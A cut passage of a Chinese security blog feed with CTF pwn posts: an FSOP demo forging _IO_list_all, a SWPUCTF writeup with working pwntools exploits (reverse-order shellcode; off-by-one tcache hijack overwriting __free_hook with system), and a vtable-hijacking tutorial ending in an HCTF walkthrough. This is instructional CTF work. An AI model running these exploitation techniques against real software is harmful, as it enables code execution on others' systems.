class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mode_offset 0xc0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writeptr_offset 0x28</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> writebase_offset 0x20</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> vtable_offset 0xd8</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *ptr;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+mode_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writeptr_offset)=<span class="number">0x1</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+writebase_offset)=<span class="number">0x0</span>;</span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+vtable_offset)=((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)ptr+<span class="number">0x100</span>+<span class="number">24</span>)=<span class="number">0x41414141</span>;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(<span class="keyword">long</span> <span class="keyword">long</span> *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[<span class="number">0</span>]=ptr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的 _IO_overflow 指针。</p><p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的_IO_FILE_plus。</p><blockquote><p>全局变量 _IO_list_all 存储着结构体 _IO_FILE_plus 的地址，这个地址也是 _IO_FILE 所在地址，后面自然是 vtable </p></blockquote><p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush[^1] 获取_IO_list_all 的值并取出作为 _IO_FILE_plus 调用其中的 _IO_overflow</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#0] 0x7ffff7a89193 → Name: _IO_flush_all_lockp(do_lock&#x3D;0x0)</span><br><span class="line">[#1] 0x7ffff7a8932a → Name: _IO_cleanup()</span><br><span class="line">[#2] 0x7ffff7a46f9b → Name: __run_exit_handlers(status&#x3D;0x0, listp&#x3D;&lt;optimized out&gt;, run_list_atexit&#x3D;0x1)</span><br><span class="line">[#3] 0x7ffff7a47045 → Name: __GI_exit(status&#x3D;&lt;optimized out&gt;)</span><br><span class="line">[#4] 0x4005ce → Name: main()</span><br></pre></td></tr></table></figure><hr><p>[^1]: 用 fwrite 等这种流 I/O 函数写入写出，数据会先放在缓冲区，并没有真正输入或者输出，需要用 fflush 冲洗流中信息才完成写入写出。避免用 fflush 冲洗就用 setbuf 函数关闭缓冲（pwn 题初始化必备）</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FSOP </tag>
            
            <tag> 堆 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020 SWPUCTF 部分Pwn Writeup</title>
      <link href="archives/216/"/>
      <url>archives/216/</url>
      
        <content type="html"><![CDATA[<blockquote><p>西南石油大学“智仁杯”</p></blockquote><h2 id="shellco"><a href="#shellco" class="headerlink" title="shellco"></a>shellco</h2><blockquote><p>本地各种系统成功，远程GG</p></blockquote><p>提示 “you lost” 之后会跳转到 data 段存储的一个地址：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207195302.png" alt="image-20201207195302677"></p><p>调试发现，写入内容是从比这个变量高的地址写入，每次写入距离都会减少 0x10 。输入内容会检查，写入 8 bit 以上会报错。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207195810.png" alt="image-20201207195810181"></p><p>倒序写入 shellcode 。</p><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>本地写入 17 次才会覆盖 0x600489 ，远程 7 次，调整之后依然不成功。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./1&quot;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;49.235.209.57&quot;,10000)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;name\n&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;aaaaaaab&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># asm(&quot;xor rdx, rdx&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;xor rcx, rcx&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;mov rbx, 0x600078&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;mov rax, 11&quot;)</span></span><br><span class="line"><span class="comment"># asm(&quot;int 0x80&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>(<span class="params">content</span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;now\n&quot;</span>)</span><br><span class="line">p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>):</span><br><span class="line">send(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *0x60036d&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = asm(&quot;xor rdx, rdx&quot;)+asm(&quot;xor rcx, rcx&quot;)+asm(&quot;mov rbx, r12&quot;)</span></span><br><span class="line"><span class="comment">#payload += asm(&quot;mov rax, 11&quot;)+asm(&quot;int 0x80&quot;)</span></span><br><span class="line">payload3 = asm(<span class="string">&quot;pop rax&quot;</span>)+asm(<span class="string">&quot;int 0x80&quot;</span>)</span><br><span class="line">send(payload3)</span><br><span class="line">payload2 = asm(<span class="string">&quot;push 11&quot;</span>)</span><br><span class="line">send(payload2)</span><br><span class="line">payload1 = asm(<span class="string">&quot;mov rbx, r12&quot;</span>)+asm(<span class="string">&quot;mov rax, rbp&quot;</span>)</span><br><span class="line">send(payload1)</span><br><span class="line"></span><br><span class="line">send(<span class="string">&#x27;\x99\x04&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="tnote"><a href="#tnote" class="headerlink" title="tnote"></a>tnote</h2><p>一开始想去怎么 unlink 攻击堆指针结构体，最后是劫持 tcache 结构体。</p><p>edit 函数中存在 off by one ：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20201207172340.png" alt="image-20201207172340156"></p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ol><li>offbyone 修改 size 位造成堆重叠，实现修改 bin 中指针效果</li><li>释放两个 tcachebin ，利用上面实现的堆重叠泄露堆地址</li><li>通过堆地址计算出 tcache 结构体（第一个 0x250 堆），通过上面实现的堆重叠修改 tcachebin fd 指针指向结构体，第二次申请就能申请到 tcache 结构体</li><li>改 tcachebin 数量标志位；off by one 改出一个 0x90 unsortedbin（这里注意绕过 free 时各种 check ）</li><li>再用堆重叠泄露 main_arena 计算 libc 地址</li><li>复原 tcachebin 数量标志位，以及 0x20 链表首地址为 free_hook</li></ol><h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;47.98.229.132&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">command</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">id</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">command(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;size?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">command(<span class="string">&#x27;E&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;idx?&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">command(<span class="string">&#x27;D&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;idx?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x78</span>)<span class="comment">#0x81</span></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#0x20=&gt;0x81-0x50=0x30</span></span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&quot;/bin/sh;&quot;</span>.ljust(<span class="number">0x78</span>,<span class="string">&#x27;a&#x27;</span>)+<span class="string">&#x27;\x81&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x78</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;heap_addr:&quot;</span>+<span class="built_in">hex</span>(heap_addr))</span><br><span class="line">tcache_addr = heap_addr-<span class="number">0x340</span></span><br><span class="line">log.info(<span class="string">&quot;tcache_addr:&quot;</span>+<span class="built_in">hex</span>(tcache_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x18</span>+p64(<span class="number">0x51</span>)+p64(tcache_addr))</span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\xFF&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>))</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">96</span></span><br><span class="line">log.info(<span class="string">&quot;main_arena:&quot;</span>+<span class="built_in">hex</span>(main_arena))</span><br><span class="line">libc_base = main_arena-<span class="number">0x3ebc40</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">free_hook = libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;free_hook:&quot;</span>+<span class="built_in">hex</span>(free_hook))</span><br><span class="line">edit(<span class="number">3</span>,<span class="string">&#x27;\x01&#x27;</span>*<span class="number">0x40</span>+p64(free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#2</span></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">2</span>,p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&quot;b *$rebase(0x202060)&quot;)</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> SWPUCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="archives/0/"/>
      <url>archives/0/</url>
      
        <content type="html"><![CDATA[<h1 id="伪造-vtable-劫持程序流程"><a href="#伪造-vtable-劫持程序流程" class="headerlink" title="伪造 vtable 劫持程序流程"></a>伪造 vtable 劫持程序流程</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>前面我们介绍了 Linux 中文件流的特性（FILE），我们可以得知 Linux 中的一些常见的 IO 操作函数都需要经过 FILE 结构进行处理。尤其是_IO_FILE_plus 结构中存在 vtable，一些函数会取出 vtable 中的指针进行调用。</p><p>因此伪造 vtable 劫持程序流程的中心思想就是针对_IO_FILE_plus 的 vtable 动手脚，通过把 vtable 指向我们控制的内存，并在其中布置函数指针来实现。</p><p>因此 <strong>vtable 劫持分为两种，一种是直接改写 vtable 中的函数指针，通过任意地址写就可以实现。另一种是覆盖 vtable 的指针指向我们控制的内存，然后在其中布置函数指针。</strong></p><h2 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h2><p>这里演示了修改 vtable 中的指针，首先需要知道_IO_FILE_plus 位于哪里，对于 fopen 的情况下是位于堆内存，对于 stdin\stdout\stderr 是位于 libc.so 中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=<span class="number">0x41414141</span> <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;call 0x41414141&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据 vtable 在_IO_FILE_plus 的偏移得到 vtable 的地址，在 64 位系统下偏移是 0xd8。之后需要搞清楚欲劫持的 IO 函数会调用 vtable 中的哪个函数。关于 IO 函数调用 vtable 的情况已经在 FILE 结构介绍一节给出了，知道了 printf 会调用 vtable 中的 xsputn，并且 xsputn 的是 vtable 中第八项之后就可以写入这个指针进行劫持。</p><p>并且在 xsputn 等 vtable 函数进行调用时，传入的第一个参数其实是对应的_IO_FILE_plus 地址。比如这例子调用 printf，传递给 vtable 的第一个参数就是_IO_2_1_stdout_的地址。</p><p>利用这点可以实现给劫持的 vtable 函数传參，比如</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_ptr;</span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    vtable_ptr=*(<span class="keyword">long</span> <span class="keyword">long</span>*)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//get vtable</span></span><br><span class="line"></span><br><span class="line">    memcopy(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    vtable_ptr[<span class="number">7</span>]=system_ptr <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是在目前 <strong>libc2.23 版本下，位于 libc 数据段的 vtable 是不可以进行写入的</strong>。不过，通过在可控的内存中伪造 vtable 的方法依然可以实现利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> system_ptr 0x7ffff7a52390;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> *vtable_addr,*fake_vtable;</span><br><span class="line"></span><br><span class="line">    fp=fopen(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rw&quot;</span>);</span><br><span class="line">    fake_vtable=<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    vtable_addr=(<span class="keyword">long</span> <span class="keyword">long</span> *)((<span class="keyword">long</span> <span class="keyword">long</span>)fp+<span class="number">0xd8</span>);     <span class="comment">//vtable offset</span></span><br><span class="line"></span><br><span class="line">    vtable_addr[<span class="number">0</span>]=(<span class="keyword">long</span> <span class="keyword">long</span>)fake_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(fp,<span class="string">&quot;sh&quot;</span>,<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    fake_vtable[<span class="number">7</span>]=system_ptr; <span class="comment">//xsputn</span></span><br><span class="line"></span><br><span class="line">    fwrite(<span class="string">&quot;hi&quot;</span>,<span class="number">2</span>,<span class="number">1</span>,fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们首先分配一款内存来存放伪造的 vtable，之后修改_IO_FILE_plus 的 vtable 指针指向这块内存。因为 vtable 中的指针我们放置的是 system 函数的地址，因此需要传递参数 “/bin/sh” 或 “sh”。</p><p>因为 vtable 中的函数调用时会把对应的_IO_FILE_plus 指针作为第一个参数传递，因此这里我们把 “sh” 写入_IO_FILE_plus 头部。之后对 fwrite 的调用就会经过我们伪造的 vtable 执行 system(“sh”)。</p><p>同样，如果程序中不存在 fopen 等函数创建的_IO_FILE 时，也可以选择 stdin\stdout\stderr 等位于 libc.so 中的_IO_FILE，这些流在 printf\scanf 等函数中就会被使用到。在 libc2.23 之前，这些 vtable 是可以写入并且不存在其他检测的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print &amp;_IO_2_1_stdin_</span><br><span class="line">$2 &#x3D; (struct _IO_FILE_plus *) 0x7ffff7dd18e0 &lt;_IO_2_1_stdin_&gt;</span><br><span class="line"></span><br><span class="line">0x00007ffff7a0d000 0x00007ffff7bcd000 0x0000000000000000 r-x &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7bcd000 0x00007ffff7dcd000 0x00000000001c0000 --- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dcd000 0x00007ffff7dd1000 0x00000000001c0000 r-- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br><span class="line">0x00007ffff7dd1000 0x00007ffff7dd3000 0x00000000001c4000 rw- &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so</span><br></pre></td></tr></table></figure><h2 id="2018-HCTF-the-end"><a href="#2018-HCTF-the-end" class="headerlink" title="2018 HCTF the_end"></a>2018 HCTF the_end</h2><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/io-file/2018_hctf_the_end/">题目链接</a></p><h3 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">0</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;here is a gift %p, good luck ;)\n&quot;</span>, &amp;sleep);</span><br><span class="line">  fflush(_bss_start);</span><br><span class="line">  close(<span class="number">1</span>);</span><br><span class="line">  close(<span class="number">2</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, &amp;buf, <span class="number">8uLL</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1337</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析题目，利用点很明确在 main 函数中，且：</p><ul><li>除了 canary 保护全开</li><li>libc 基地址和 libc 版本</li><li>能够任意位置写 5 字节</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul><li>利用的是在程序调用 <code>exit</code> 后，会遍历 <code>_IO_list_all</code> ，调用 <code>_IO_2_1_stdout_</code> 下的 <code>vatable</code> 中 <code>_setbuf</code> 函数。</li><li>可以先修改两个字节在当前 <code>vtable</code> 